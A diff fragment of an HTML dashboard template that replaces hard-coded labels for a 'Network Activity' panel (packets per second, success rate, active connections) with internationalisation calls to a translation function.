                     <div class="p-4 border-b border-cyan-500/20">
-                        <h3 class="text-lg font-semibold text-white">Network Activity</h3>
+                        <h3 class="text-lg font-semibold text-white">{{ t('dashboard.networkActivity', 'Network Activity') }}</h3>
                     </div>
                     <div class="p-4">
                         <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                             <div class="text-center">
                                 <div class="text-3xl font-mono text-cyan-400 mb-1">2.4K</div>
-                                <div class="text-xs text-gray-400 uppercase">Packets/sec</div>
+                                <div class="text-xs text-gray-400 uppercase">{{ t('dashboard.packetsPerSec', 'Packets/sec') }}</div>
                             </div>
                             <div class="text-center">
                                 <div class="text-3xl font-mono text-green-400 mb-1">98.2%</div>
-                                <div class="text-xs text-gray-400 uppercase">Success Rate</div>
+                                <div class="text-xs text-gray-400 uppercase">{{ t('dashboard.successRate', 'Success Rate') }}</div>
                             </div>
                             <div class="text-center">
                                 <div class="text-3xl font-mono text-yellow-400 mb-1">12</div>
-                                <div class="text-xs text-gray-400 uppercase">Active Connections</div>
+                                <div class="text-xs text-gray-400 uppercase">{{ t('dashboard.activeConnections', 'Active Connections') }}</div>
                             </div>
                         </div>
                     </div>
